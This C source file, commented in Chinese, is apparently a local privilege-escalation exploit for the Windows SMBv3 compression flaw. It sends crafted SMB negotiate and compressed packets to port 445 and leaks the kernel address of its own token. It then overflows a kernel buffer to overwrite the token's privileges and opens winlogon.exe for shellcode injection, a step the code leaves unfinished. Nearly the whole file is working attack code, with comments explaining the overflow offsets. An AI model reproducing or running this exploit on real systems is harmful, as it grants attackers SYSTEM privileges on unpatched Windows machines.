#include <stdio.h>
#include <stdint.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <TlHelp32.h>
#include "ntos.h"
#pragma comment(lib, "ws2_32.lib")
//定义协商协议的数据包
int DisscusProtocol(SOCKET sock)
{
	//协商协议数据包的构建要点:使用压缩算法以及SMBv3
	int send_count = 0;
	char response[514] = {0};
	const uint8_t buf[] = {
		//NtBIOS Session
		0x00,//SessionMessage
		0x00,0x00,0xb2,//Length
		//SMB_Header
		0xfe,0x53,0x4d,0x42,//Server Component
		0x40,0x00,//Header_length
		0x00,0x00,0x00,0x00,
		0x00,0x00,0x00,0x00,
		0x00,0x00,
		0x00,0x00,0x00,0x00,//Flags
		0x00,0x00,0x00,0x00,
		0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
		0x00,0x00,0x00,0x00,//ProcessID
		0x00,0x00,0x00,0x00,//TreeID
		0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,//SessionID
		0x00,0x00,0x00,0x00,//Signature
		0x00,0x00,0x00,0x00,
		0x00,0x00,0x00,0x00,
		0x00,0x00,0x00,0x00,
		//Negotiate Protocol Request
		0x24,0x00,//Structure Size
		0x05,0x00,//Dialect count
		0x00,0x00,//Security mode
		0x00,0x00,//保留位
		0x44,0x00,0x00,0x00,//Capabilities
		0x13,0x37,0xc0,0xde,//GUID
		0x13,0x37,0xc0,0xde,
		0x13,0x37,0xc0,0xde,
		0x13,0x37,0xc0,0xde,
		0x70,0x00,0x00,0x00,//NegotiateContextOffset
		0x02,0x00,//NegotiateContextCount
		0x00,0x00,//保留位
		0x02,0x02,
		0x10,0x02,
		0x00,0x03,
		0x02,0x03,
		0x11,0x03,
		0x00,0x00,//对齐粒度
		//Negotiate Context
		0x01,0x00,//Type
		0x26,0x00,//DataLength
		0x00,0x00,0x00,0x00,
		0x01,0x00,
		0x20,0x00,
		0x01,0x00,
		0x00,0x00,0x00,0x00,//salt
		0x00,0x00,0x00,0x00,
		0x00,0x00,0x00,0x00,
		0x00,0x00,0x00,0x00,
		0x00,0x00,0x00,0x00,
		0x00,0x00,0x00,0x00,
		0x00,0x00,0x00,0x00,
		0x00,0x00,0x00,0x00,
		0x00,0x00,//对齐粒度
		0x03,0x00,0x0a,0x00,
		0x00,0x00,0x00,0x00,
		0x01,0x00,0x00,0x00,
		0x01,0x00,0x00,0x00,
		0x01,0x00
	};
	//构造好数据之后准备发送数据
	send_count=send(sock,(const char *)buf,sizeof(buf), 0);
	if (send_count != SOCKET_ERROR)
	{
		recv(sock,response,sizeof(response),0);
	}
	else
	{
		printf("发送数据失败");
		system("pause");
	}
	return send_count;
}
//泄露内核地址
ULONG64 get_handle_addr(HANDLE h) {
	ULONG len = 20;
	NTSTATUS status = (NTSTATUS)0xc0000004;
	PSYSTEM_HANDLE_INFORMATION_EX pHandleInfo = NULL;
	do {
		len *= 2;
		pHandleInfo = (PSYSTEM_HANDLE_INFORMATION_EX)GlobalAlloc(GMEM_ZEROINIT, len);
		status = NtQuerySystemInformation(SystemExtendedHandleInformation, pHandleInfo, len, &len);
	} while (status == (NTSTATUS)0xc0000004);

	if (status != (NTSTATUS)0x0) {
		printf("NtQuerySystemInformation() failed with error: %#x\n", status);
		return 1;
	}

	DWORD mypid = GetProcessId(GetCurrentProcess());
	ULONG64 ptrs[1000] = { 0 };
	for (int i = 0; i < pHandleInfo->NumberOfHandles; i++) {
		PVOID object = pHandleInfo->Handles[i].Object;
		ULONG_PTR handle = pHandleInfo->Handles[i].HandleValue;
		DWORD pid = (DWORD)pHandleInfo->Handles[i].UniqueProcessId;
		if (pid != mypid)
			continue;
		if (handle == (ULONG_PTR)h)
			return (ULONG64)object;
	}
	return -1;
}

ULONG64 get_process_token() {
	HANDLE token;
	HANDLE proc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, GetCurrentProcessId());
	if (proc == INVALID_HANDLE_VALUE)
		return 0;

	OpenProcessToken(proc, TOKEN_ADJUST_PRIVILEGES, &token);
	ULONG64 ktoken = get_handle_addr(token);

	return ktoken;
}
//发送特制的压缩格式数据包
int send_compressed_data(SOCKET socket , UCHAR* Buffer, ULONG BufferSize)
{
	//构造数据包
	char response[514] = {0};
	uint8_t buf[] = {
	//NetBIOSSessionService
	0x00,0x00,0x00,0x33,
	//SMB消息头
	0xfc,0x53,0x4d,0x42,
	//OriginalCompressedSegmentSize触发漏洞
	0xff,0xff,0xff,0xff,
	//压缩算法CompressionAlgorithm
	0x02,0x00,
	//标志位Flags
	0x00,0x00,
	//offset
	0x10,0x00,0x00,0x00
	};
	//整个数据包的大小
	uint8_t* Data_Packet = (uint8_t*)malloc(sizeof(buf)+0x10+BufferSize);
	if (Data_Packet == NULL)
	{
		printf("申请压缩包空间失败");
		system("pause");
	}
	//构造要替换管理员令牌的数据
	memcpy(Data_Packet,buf,sizeof(buf));
	*(uint64_t*)(Data_Packet + sizeof(buf)) = 0x1FF2FFFFBC;
	*(uint64_t*)(Data_Packet + sizeof(buf)+0x8) = 0x1FF2FFFFBC;
	//将压缩数据和未压缩的数据一起放进一个压缩的数据包中
	memcpy(Data_Packet+sizeof(buf)+0x10,Buffer,BufferSize);
	//至此数据包已经完全构造完毕，接下来开始发送完整的数据包
	if (send(socket, (const char*)Data_Packet, sizeof(buf) + 0x10 + BufferSize, 0) == SOCKET_ERROR)
	{
		printf("%d",GetLastError());
		printf("发送压缩数据失败");
		return -1;
	}
	else
		recv(socket,response,sizeof(response),0);
}
void inject(void) {
	PROCESSENTRY32 entry;
	entry.dwSize = sizeof(PROCESSENTRY32);
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

	int pid = -1;
	if (Process32First(snapshot, &entry) == TRUE) {
		while (Process32Next(snapshot, &entry) == TRUE) {
			if (lstrcmpiA(entry.szExeFile, "winlogon.exe") == 0) {
				pid = entry.th32ProcessID;
				break;
			}
		}
	}
	CloseHandle(snapshot);

	if (pid < 0) {
		printf("Could not find process\n");
		return;
	}
	printf("Injecting shellcode in winlogon...\n");

	HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	if (hProc == NULL)
	{
		printf("提权失败%d",GetLastError());
		system("pause");
	}
}
int main()
{
	//第一步:先创建Socket
	//需要先初始化WSASetup,声明使用的版本
	WORD wVersionRequested = MAKEWORD(2, 2);//申明WinSock调用版本
	WSADATA wsaData = { 0 };
	SOCKET sock = INVALID_SOCKET;
	
	//初始化WSASetup
	if (WSAStartup(wVersionRequested, (LPWSADATA)&wsaData))
	{
		printf("初始化失败");
		system("pause");
	}
	//创建套接字
	sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (sock == INVALID_SOCKET)
	{
		printf("套接字创建失败");
		system("pause");
	}
	//准备连接目标IP地址
	sockaddr_in client;
	client.sin_family = AF_INET;//指定使用IPv4
	client.sin_port = htons(445);//指定端口为445
	InetPton(AF_INET,"127.0.0.1", &client.sin_addr);
	//发起连接
	if (connect(sock, (sockaddr*)&client, sizeof(client)))
	{
		printf("建立连接失败");
		printf("%d",GetLastError());
		system("pause");
	}
	//建立连接之后需要发送协商协议的数据包
	DisscusProtocol(sock);
	//之后进行操作：构造压缩数据包，压缩的数据包中
	//包含泄露出来的内核地址，还有未压缩的数据，未压缩的数据中包含要替换的令牌的信息
	//接下来的操作：泄露内核地址
	uint64_t TokenAddr = get_process_token();
	if (TokenAddr == -1)
	{
		printf("Fail to get TokenAddr");
		system("pause");
	}
	//接下来构造要发送的压缩的数据，这部分数据会溢出覆盖SRVNET_HDR结构，也就是这部分内容写需要将任意地址写构造出来
	//因此需要将想要修改的内核地址放到这部分
	//申请内存空间
	//这里需要注意一下申请的内存空间的大小，也就是压缩的原数据要申请的大小
	//因为我们设置超大值的OriginalSize0xffff,以及offset=0x10,所以相当于只会申请0xf的内存空间，因此调用后备列表进行内存分配，
	//实际分配内存大小为0x1100,再加上0x8大小的对齐粒度以及要覆盖的内容，而且由于解压后的数据存储位置在申请的缓冲区0x10的位置开始存储
	//所以可以计算原始数据的大小为:size=后备列表空间大小0x1100-0x10(开始存储位置)+0x8(对齐粒度)+0x18(存储缓冲区的地址，也是要覆盖的字段的偏移)=0x1110
	ULONG Buffsize = 0x1110;
	UCHAR* buffer = (UCHAR*)malloc(Buffsize);
	if (buffer == NULL) 
	{
		printf("Couldn't allocate memory with malloc()\n");
		system("pause");
	}
	//填充缓冲区
	memset(buffer,'A',0x1108);
	*(uint64_t*)(buffer + 0x1108) = TokenAddr + 0x40;//要写入的目标地址
	//之后将数据压缩，一点需要注意，与之后构造的SMB消息数据包采用相同的压缩算法
	ULONG CompressBufferWorkSpaceSize;
	ULONG CompressFragmentWorkSpaceSize;
	if (RtlGetCompressionWorkSpaceSize(
		COMPRESSION_FORMAT_XPRESS,//指定压缩算法
		&CompressBufferWorkSpaceSize,
		&CompressFragmentWorkSpaceSize
	) != STATUS_SUCCESS)
	{
		printf("初始化压缩算法失败");
		system("pause");
	}
	ULONG FinalCompressedSize;
	UCHAR compressed_buffer[64];
	LPVOID lpWorkSpace = malloc(CompressBufferWorkSpaceSize);
	if (RtlCompressBuffer(COMPRESSION_FORMAT_XPRESS, buffer, Buffsize,
		compressed_buffer, sizeof(compressed_buffer), 4096, &FinalCompressedSize, lpWorkSpace) != STATUS_SUCCESS)
	{
		printf("数据压缩失败");
		system("pause");
	}
	//之后准备发送压缩好的数据
	int status=send_compressed_data(sock,compressed_buffer,FinalCompressedSize);
	if (status == -1)
	{
		printf("发送压缩数据失败");
		system("pause");
	}
	WSACleanup();
	printf("Test Over");
	system("pause");
	inject();
}
